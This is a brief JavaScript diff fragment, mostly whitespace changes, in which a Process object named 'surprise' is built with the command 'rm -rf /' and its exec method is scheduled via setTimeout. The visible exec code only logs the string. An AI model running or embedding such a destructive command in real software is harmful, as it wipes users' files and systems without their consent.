@@ -8,8 +8,9 @@ class Process {
   console.log(`$: ${this.cmd}`);
     }
   }
-const surprise = new Process('rm -rf /');
-
+  const surprise = new Process('rm -rf /');
+  
+  
 setTimeout(surprise.exec.bind(surprise), 1000);
 
 setTimeout(()=>{surprise.exec()}, 1000);
